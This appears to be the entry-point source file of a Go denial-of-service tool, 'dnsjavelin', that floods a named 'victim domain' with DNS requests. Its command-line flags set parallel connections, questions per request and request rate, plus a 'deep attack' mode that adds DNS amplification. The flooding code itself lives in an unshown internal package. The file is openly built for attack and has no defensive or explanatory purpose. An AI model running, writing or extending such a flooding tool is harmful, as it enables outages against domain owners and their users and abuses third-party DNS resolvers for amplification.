package main

import (
	"flag"
	"log"
	"runtime"
	"time"

	"github.com/sheophe/dnsjavelin/internal"
)

func main() {
	launcher := internal.Launcher{
		VictimDomain: flag.String("d", "", "victim domain name"),
		NRoutines:    flag.Int("c", 2*runtime.NumCPU(), "number of parallel connections"),
		NQuestions:   flag.Int("n", 16, "number of DNS qeustion in one request"),
		SleepTime:    flag.Duration("s", time.Millisecond, "sleep between requests"),
		Deep:         flag.Bool("x", false, "deep attack. includes DNS amplification"),
	}
	flag.Parse()
	if len(*launcher.VictimDomain) == 0 {
		log.Fatalf("victim domain must be specified")
	}
	launcher.Initialize()
	launcher.Start()
	launcher.AwaitShutdown()
	launcher.Stop()
}
